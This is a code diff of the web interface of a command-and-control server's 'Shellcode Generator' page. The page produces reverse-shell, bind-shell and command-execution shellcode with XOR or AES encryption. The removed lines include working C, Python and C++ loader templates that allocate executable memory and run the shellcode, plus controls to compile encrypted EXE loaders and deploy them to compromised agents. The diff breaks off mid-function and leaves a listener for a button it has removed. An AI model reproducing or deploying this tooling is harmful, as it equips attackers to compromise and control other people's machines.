@@ -1,7 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Shellcode Generator</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shellcode Generator - C2 Server</title>
 
     <!-- Highlight.js for syntax highlighting -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
@@ -9,226 +11,248 @@
 
     <style>
         :root {
-            --bg: #f0f0f0;
-            --text: #000;
+            --bg: #f4f4f4;
+            --text: #333;
             --card: #fff;
+            --border: #ddd;
+            --primary: #007BFF;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
         }
 
         [data-theme="dark"] {
             --bg: #121212;
-            --text: #f0f0f0;
+            --text: #f4f4f4;
             --card: #1e1e1e;
+            --border: #333;
+            --primary: #0d6efd;
         }
 
         body {
+            font-family: Arial, sans-serif;
             background-color: var(--bg);
             color: var(--text);
-            font-family: Arial, sans-serif;
             margin: 0;
             padding: 20px;
-            transition: background 0.3s, color 0.3s;
+            transition: background-color 0.3s, color 0.3s;
         }
 
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            background-color: var(--card);
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
         }
 
         h1 {
+            color: var(--text);
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+        }
+
+        nav {
+            margin-bottom: 30px;
             text-align: center;
         }
 
-        .nav {
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .nav a {
-            margin: 0 10px;
+        nav a {
+            margin: 0 15px;
             text-decoration: none;
-            color: #007bff;
+            color: var(--primary);
+            font-weight: 500;
+            font-size: 1.1em;
+            transition: color 0.3s;
+        }
+
+        nav a:hover {
+            color: var(--text);
+        }
+
+        .form-container {
+            background-color: var(--card);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin: 20px auto;
+            max-width: 800px;
+            text-align: left;
         }
 
         .form-group {
-            margin: 15px 0;
+            margin-bottom: 20px;
         }
 
         label {
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            color: var(--text);
+            font-weight: 500;
         }
 
-        input, select {
+        input[type="text"],
+        select {
             width: 100%;
-            padding: 8px;
-            margin: 5px 0;
-            border: 1px solid #ccc;
+            padding: 10px;
+            border: 1px solid var(--border);
             border-radius: 4px;
+            background-color: var(--bg);
+            color: var(--text);
+            font-size: 14px;
+        }
+
+        select {
+            cursor: pointer;
         }
 
         button {
-            background-color: #007bff;
+            background-color: var(--primary);
             color: white;
-            padding: 8px 16px;
             border: none;
+            padding: 12px 24px;
             border-radius: 4px;
             cursor: pointer;
-            margin: 5px 5px 5px 0;
+            font-size: 16px;
+            transition: all 0.3s;
         }
 
         button:hover {
-            background-color: #0056b3;
+            opacity: 0.9;
+            transform: translateY(-1px);
         }
 
-        .toggle {
-            float: right;
+        .toggle-theme {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
         }
 
-        pre code {
-            display: block;
-            padding: 15px;
-            font-size: 14px;
-            overflow-x: auto;
-            border-radius: 6px;
-            background: #1e1e1e;
-            color: #fff;
+        .toggle-theme:hover {
+            background-color: var(--primary);
+            color: white;
+            border-color: var(--primary);
         }
 
-        .view-tabs button.active {
-            background-color: #007bff;
-            color: #fff;
+        #output {
+            margin-top: 30px;
+            text-align: left;
         }
 
-        #result {
-            display: none;
+        .output-container {
+            background-color: var(--card);
+            padding: 20px;
+            border-radius: 8px;
             margin-top: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        pre {
+            background-color: var(--bg);
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 0;
+        }
+
+        .copy-button {
+            margin-top: 10px;
+            background-color: var(--success);
+        }
+
+        .download-button {
+            margin-top: 10px;
+            margin-left: 10px;
+            background-color: var(--primary);
         }
     </style>
 </head>
 <body>
+    <button class="toggle-theme" onclick="toggleTheme()">🌙 Toggle Dark Mode</button>
+
     <div class="container">
-        <div class="toggle">
-            <button onclick="toggleTheme()">🌙 Toggle Dark Mode</button>
-        </div>
         <h1>Shellcode Generator</h1>
-        <div class="nav">
+        <nav>
             <a href="/">Dashboard</a>
             <a href="/shellcode">Shellcode Generator</a>
             <a href="/control">Task Control Panel</a>
-        </div>
+        </nav>
 
-        <form id="shellcodeForm">
-            <div class="form-group">
-                <label for="platform">Target Platform:</label>
-                <select id="platform" required>
-                    <option value="windows">Windows</option>
-                    <option value="linux">Linux</option>
-                    <option value="macos">macOS</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="shellcodeType">Shellcode Type:</label>
-                <select id="shellcodeType" required>
-                    <option value="reverse">Reverse Shell</option>
-                    <option value="bind">Bind Shell</option>
-                    <option value="exec">Command Execution</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="hostGroup">
-                <label for="host">Host (for Reverse Shell):</label>
-                <input type="text" id="host" placeholder="e.g., 192.168.1.100">
-            </div>
-
-            <div class="form-group">
-                <label for="port">Port:</label>
-                <input type="number" id="port" required placeholder="e.g., 4444">
-            </div>
-
-            <div class="form-group" id="commandGroup" style="display: none;">
-                <label for="command">Command:</label>
-                <input type="text" id="command" placeholder="e.g., calc.exe">
-            </div>
-
-            <div class="form-group">
-                <label for="encoding">Encoding:</label>
-                <select id="encoding">
-                    <option value="base64">Base64</option>
-                    <option value="hex">Hex</option>
-                    <option value="ascii">ASCII</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="encryption">Encryption:</label>
-                <select id="encryption">
-                    <option value="none">None</option>
-                    <option value="xor">XOR</option>
-                    <option value="aes">AES</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="keyGroup" style="display: none;">
-                <label for="key">Encryption Key:</label>
-                <input type="text" id="key" placeholder="Enter encryption key">
-                <button type="button" onclick="generateRandomKey()">Generate Random Key</button>
-            </div>
-
-            <button type="submit">Generate Shellcode</button>
-        </form>
-
-        <div id="result">
-            <h3>Shellcode Output</h3>
-            <div class="view-tabs">
-                <button type="button" class="active" onclick="changeView('encoded')">Encoded</button>
-                <button type="button" onclick="changeView('c')">C-style</button>
-                <button type="button" onclick="changeView('python')">Python</button>
-                <button type="button" onclick="changeView('raw')">Raw Bytes</button>
-            </div>
-            <pre><code id="shellcodeOutput" class="plaintext">No output yet...</code></pre>
-            <button id="copyShellcodeBtn">📋 Copy</button>
-            <button onclick="downloadShellcode()">⬇️ Download Shellcode</button>
-            <button onclick="downloadStub('c')">.c Loader</button>
-            <button onclick="downloadStub('python')">.py Loader</button>
-            <button onclick="compileAndDownloadExe()">.exe Loader</button>
-            
-            <!-- Add loader encryption options -->
-            <div style="margin-top: 15px; border-top: 1px solid #ccc; padding-top: 15px;">
-                <h4>Encrypted EXE Loader Options</h4>
+        <div class="form-container">
+            <form id="shellcodeForm">
                 <div class="form-group">
-                    <label for="loaderEncryption">Loader Encryption:</label>
-                    <select id="loaderEncryption">
-                        <option value="aes">AES-128 (Recommended)</option>
-                        <option value="xor">XOR (Simple)</option>
+                    <label for="platform">Target Platform:</label>
+                    <select id="platform" required>
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                        <option value="macos">macOS</option>
                     </select>
                 </div>
+
                 <div class="form-group">
-                    <label for="loaderEncKey">Encryption Key (Optional):</label>
-                    <input type="text" id="loaderEncKey" placeholder="Leave blank for auto-generated key">
-                    <small style="display: block; color: #666;">- AES: 16 chars (will be padded/truncated)<br>- XOR: Any length (longer is better)</small>
+                    <label for="shellcodeType">Shellcode Type:</label>
+                    <select id="shellcodeType" required>
+                        <option value="reverse">Reverse Shell</option>
+                        <option value="bind">Bind Shell</option>
+                        <option value="exec">Command Execution</option>
+                    </select>
                 </div>
-                <button id="generateExeLoaderBtn">🔐 Generate Encrypted EXE</button>
-            </div>
-            
-            <!-- Fallback form in case JS fetch API has issues -->
-            <form id="exeGeneratorForm" action="/generate_loader_exe" method="post" style="display:none;">
-                <input type="hidden" id="shellcodeInput" name="shellcode" value="">
-                <input type="hidden" id="encryptionTypeInput" name="encryption" value="aes">
-                <input type="hidden" id="encryptionKeyInput" name="key" value="">
+
+                <div class="form-group" id="hostGroup">
+                    <label for="host">Host (for Reverse Shell):</label>
+                    <input type="text" id="host" placeholder="e.g., 192.168.1.100">
+                </div>
+
+                <div class="form-group">
+                    <label for="port">Port:</label>
+                    <input type="number" id="port" required placeholder="e.g., 4444">
+                </div>
+
+                <div class="form-group" id="commandGroup" style="display: none;">
+                    <label for="command">Command:</label>
+                    <input type="text" id="command" placeholder="e.g., calc.exe">
+                </div>
+
+                <div class="form-group">
+                    <label for="encoding">Encoding:</label>
+                    <select id="encoding">
+                        <option value="base64">Base64</option>
+                        <option value="hex">Hex</option>
+                        <option value="ascii">ASCII</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="encryption">Encryption:</label>
+                    <select id="encryption">
+                        <option value="none">None</option>
+                        <option value="xor">XOR</option>
+                        <option value="aes">AES</option>
+                    </select>
+                </div>
+
+                <div class="form-group" id="keyGroup" style="display: none;">
+                    <label for="key">Encryption Key:</label>
+                    <input type="text" id="key" placeholder="Enter encryption key">
+                    <button type="button" onclick="generateRandomKey()">Generate Random Key</button>
+                </div>
+
+                <button type="submit">Generate Shellcode</button>
             </form>
-            <div id="deployOptions" style="display: none; margin-top: 15px; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
-                <h4>Deployment Options</h4>
-                <div class="form-group">
-                    <label for="agentId">Target Agent ID:</label>
-                    <input type="text" id="agentId" placeholder="e.g., agent_123456">
-                </div>
-                <button id="deployToAgentBtn">📡 Deploy Loader to Agent</button>
-                <div id="deployStatus" style="margin-top: 10px; font-style: italic;"></div>
+        </div>
+
+        <div id="output" style="display: none;">
+            <h2>Generated Shellcode</h2>
+            <div class="output-container">
+                <pre><code id="shellcodeOutput">No shellcode generated yet...</code></pre>
+                <button class="copy-button" onclick="copyShellcode()">📋 Copy Shellcode</button>
+                <button class="download-button" onclick="downloadShellcode()">⬇️ Download</button>
             </div>
         </div>
     </div>
@@ -252,375 +276,67 @@
             keyGroup.style.display = this.value !== 'none' ? 'block' : 'none';
         });
 
-        document.getElementById('shellcodeForm').addEventListener('submit', function (e) {
+        document.getElementById('shellcodeForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-
-            const type = document.getElementById('shellcodeType').value;
-            const platform = document.getElementById('platform').value;
-            const port = document.getElementById('port').value;
-            const encoding = document.getElementById('encoding').value;
-            const encryption = document.getElementById('encryption').value;
-            const host = document.getElementById('host').value;
-            const command = document.getElementById('command').value;
-            const key = document.getElementById('key').value;
-
-            const data = {
-                type,
-                platform,
-                port,
-                encoding,
-                encryption
+            const formData = {
+                platform: document.getElementById('platform').value,
+                type: document.getElementById('shellcodeType').value,
+                host: document.getElementById('host').value,
+                port: document.getElementById('port').value,
+                encoding: document.getElementById('encoding').value,
+                encryption: document.getElementById('encryption').value
             };
 
-            if (type === 'reverse') data.host = host;
-            if (type === 'exec') data.command = command;
-            if (encryption !== 'none') data.key = key;
-
-            fetch('/api/generate_shellcode', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.shellcode) {
-                    encodedShellcode = data.shellcode;
-                    document.getElementById('result').style.display = 'block';
-                    document.querySelector('.view-tabs button.active').click();
-                } else {
-                    document.getElementById('shellcodeOutput').textContent = 'Error: ' + (data.error || 'Unknown');
-                }
-                highlight();
-            })
-            .catch(err => {
-                document.getElementById('shellcodeOutput').textContent = 'Client error: ' + err;
-                highlight();
-            });
-        });
-
-        function changeView(view) {
-            document.querySelectorAll('.view-tabs button').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-
-            let output = encodedShellcode;
-
-            if (view === 'c') {
-                output = encodedShellcode.match(/.{1,2}/g)?.map(b => `\\x${b}`).join('');
-            } else if (view === 'python') {
-                output = "b'" + encodedShellcode.match(/.{1,2}/g)?.map(b => `\\x${b}`).join('') + "'";
-            } else if (view === 'raw') {
-                output = encodedShellcode.match(/.{1,2}/g)?.join(' ');
-            }
-
-            document.getElementById('shellcodeOutput').textContent = output || '';
-            highlight();
-        }
-
-        document.addEventListener("DOMContentLoaded", function () {
-            const copyBtn = document.getElementById("copyShellcodeBtn");
-            const shellcodeOutput = document.getElementById("shellcodeOutput");
-
-            copyBtn.addEventListener("click", function () {
-                const text = shellcodeOutput.innerText || shellcodeOutput.textContent;
-                navigator.clipboard.writeText(text).then(() => {
-                    copyBtn.innerText = "✅ Copied!";
-                    setTimeout(() => copyBtn.innerText = "📋 Copy", 1500);
-                }).catch(err => {
-                    alert("Failed to copy shellcode: " + err);
+            try {
+                const response = await fetch('/api/generate_shellcode', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
                 });
-            });
+
+                const data = await response.json();
+                if (data.shellcode) {
+                    document.getElementById('output').style.display = 'block';
+                    document.getElementById('shellcodeOutput').textContent = data.shellcode;
+                } else {
+                    throw new Error(data.error || 'Failed to generate shellcode');
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
         });
+
+        function copyShellcode() {
+            const shellcode = document.getElementById('shellcodeOutput').textContent;
+            navigator.clipboard.writeText(shellcode).then(() => {
+                const copyBtn = document.querySelector('.copy-button');
+                copyBtn.textContent = '✅ Copied!';
+                setTimeout(() => copyBtn.textContent = '📋 Copy Shellcode', 2000);
+            });
+        }
 
         function downloadShellcode() {
-            const content = document.getElementById('shellcodeOutput').textContent;
-            const blob = new Blob([content], { type: 'text/plain' });
+            const shellcode = document.getElementById('shellcodeOutput').textContent;
+            const blob = new Blob([shellcode], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
             const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
+            a.href = url;
             a.download = 'shellcode.txt';
+            document.body.appendChild(a);
             a.click();
-        }
-
-        function compileAndDownloadExe() {
-            const output = document.getElementById('shellcodeOutput').textContent;
-            if (!output) {
-                alert('Please generate shellcode first.');
-                return;
-            }
-
-            const platform = document.getElementById('platform').value;
-            const button = event.target;
-            const originalText = button.innerHTML;
-            
-            // Update button state to indicate compilation
-            button.innerHTML = 'Compiling...';
-            button.disabled = true;
-            
-            // Make request to compile
-            fetch('/compile_shellcode_exe', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    shellcode: output,
-                    platform: platform
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    return response.json().then(data => {
-                        throw new Error(data.error || 'Error compiling executable');
-                    });
-                }
-                return response.blob();
-            })
-            .then(blob => {
-                // Create download link
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'shellcode_loader.exe';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-                
-                // Update button to show success
-                button.innerHTML = 'Downloaded!';
-                setTimeout(() => {
-                    button.innerHTML = originalText;
-                    button.disabled = false;
-                }, 2000);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                
-                // If the error is about missing compilers, offer alternative solution
-                if (error.message && (error.message.includes('compiler not found') || 
-                    error.message.includes('No suitable compiler'))) {
-                    alert('Compiler not found! Please use the ".c Loader" button instead to download the C source code, which you can compile manually.');
-                } else {
-                    alert('Failed to compile executable: ' + error.message);
-                }
-                
-                // Reset button state
-                button.innerHTML = originalText;
-                button.disabled = false;
-            });
-        }
-
-        function downloadStub(type) {
-            const platform = document.getElementById('platform').value;
-            const output = document.getElementById('shellcodeOutput').textContent;
-            
-            let stub = '';
-            let filename = '';
-            
-            if (type === 'c') {
-                filename = 'shellcode_loader.c';
-                stub = generateCStub(output, platform);
-            } else if (type === 'python') {
-                filename = 'shellcode_loader.py';
-                stub = generatePythonStub(output, platform);
-            } else if (type === 'exe') {
-                filename = 'shellcode_loader.cpp';
-                stub = generateExeStub(output, platform);
-            }
-            
-            const blob = new Blob([stub], { type: 'text/plain' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = filename;
-            a.click();
-        }
-        
-        function generateCStub(shellcode, platform) {
-            if (platform === 'windows') {
-                return `#include <windows.h>
-#include <stdio.h>
-
-unsigned char shellcode[] = "${shellcode}";
-
-int main() {
-    LPVOID lpAlloc = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (lpAlloc == NULL) {
-        printf("Memory allocation failed\\n");
-        return -1;
-    }
-    
-    memcpy(lpAlloc, shellcode, sizeof(shellcode));
-    
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);
-    if (hThread != NULL) {
-        WaitForSingleObject(hThread, INFINITE);
-        CloseHandle(hThread);
-    }
-    
-    return 0;
-}`;
-            } else {
-                return `#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <unistd.h>
-
-unsigned char shellcode[] = "${shellcode}";
-
-int main() {
-    void *mem = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    if (mem == MAP_FAILED) {
-        perror("mmap");
-        return -1;
-    }
-    
-    memcpy(mem, shellcode, sizeof(shellcode));
-    
-    int (*sc)() = (int(*)())mem;
-    sc();
-    
-    return 0;
-}`;
-            }
-        }
-        
-        function generatePythonStub(shellcode, platform) {
-            if (platform === 'windows') {
-                return `import ctypes
-import platform
-
-# Shellcode
-shellcode = ${shellcode}
-
-# Allocate memory with RWX permissions
-ptr = ctypes.windll.kernel32.VirtualAlloc(
-    ctypes.c_int(0), 
-    ctypes.c_int(len(shellcode)), 
-    ctypes.c_int(0x3000), 
-    ctypes.c_int(0x40)
-)
-
-# Copy shellcode to allocated memory
-buffer = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(
-    ctypes.c_int(ptr), 
-    buffer, 
-    ctypes.c_int(len(shellcode))
-)
-
-# Create a function pointer to our shellcode
-ht = ctypes.windll.kernel32.CreateThread(
-    ctypes.c_int(0),
-    ctypes.c_int(0),
-    ctypes.c_int(ptr),
-    ctypes.c_int(0),
-    ctypes.c_int(0),
-    ctypes.pointer(ctypes.c_int(0))
-)
-
-# Wait for thread to complete
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
-`;
-            } else {
-                return `import ctypes
-import mmap
-import platform
-
-# Shellcode
-shellcode = ${shellcode}
-
-# Make memory executable
-memory = mmap.mmap(
-    -1, 
-    len(shellcode),
-    flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
-    prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC
-)
-
-# Write shellcode to memory
-memory.write(shellcode)
-
-# Cast memory to callable function and execute
-function = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_void_p.from_buffer(memory)))
-function()
-`;
-            }
-        }
-        
-        function generateExeStub(shellcode, platform) {
-            if (platform === 'windows') {
-                return `#include <windows.h>
-#include <iostream>
-
-// Shellcode
-unsigned char shellcode[] = "${shellcode}";
-
-int main() {
-    // Allocate memory for shellcode
-    LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!lpAlloc) {
-        std::cerr << "Memory allocation failed: " << GetLastError() << std::endl;
-        return 1;
-    }
-
-    // Copy shellcode to allocated memory
-    memcpy(lpAlloc, shellcode, sizeof(shellcode));
-
-    // Execute shellcode
-    DWORD threadId;
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, &threadId);
-    if (!hThread) {
-        std::cerr << "Thread creation failed: " << GetLastError() << std::endl;
-        VirtualFree(lpAlloc, 0, MEM_RELEASE);
-        return 1;
-    }
-
-    // Wait for shellcode execution to complete
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    VirtualFree(lpAlloc, 0, MEM_RELEASE);
-
-    return 0;
-}`;
-            } else {
-                return `#include <iostream>
-#include <sys/mman.h>
-#include <cstring>
-#include <unistd.h>
-
-// Shellcode
-unsigned char shellcode[] = "${shellcode}";
-
-int main() {
-    // Allocate memory with read/write/execute permissions
-    void* mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (mem == MAP_FAILED) {
-        std::cerr << "Memory allocation failed: " << strerror(errno) << std::endl;
-        return 1;
-    }
-
-    // Copy shellcode to allocated memory
-    memcpy(mem, shellcode, sizeof(shellcode));
-
-    // Execute shellcode
-    int (*sc)() = (int(*)())mem;
-    sc();
-
-    // Clean up (though we may never reach this point)
-    munmap(mem, sizeof(shellcode));
-    return 0;
-}`;
-            }
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
         }
 
         function toggleTheme() {
             const current = localStorage.getItem('theme') || 'light';
-            const next = current === 'dark' ? 'light' : 'dark';
+            const next = current === 'light' ? 'dark' : 'light';
             localStorage.setItem('theme', next);
             document.body.setAttribute('data-theme', next);
         }
 
-        // Function to generate encrypted EXE loader
         document.getElementById('generateExeLoaderBtn').addEventListener('click', function() {
             if (!encodedShellcode) {
                 alert('Please generate shellcode first!');
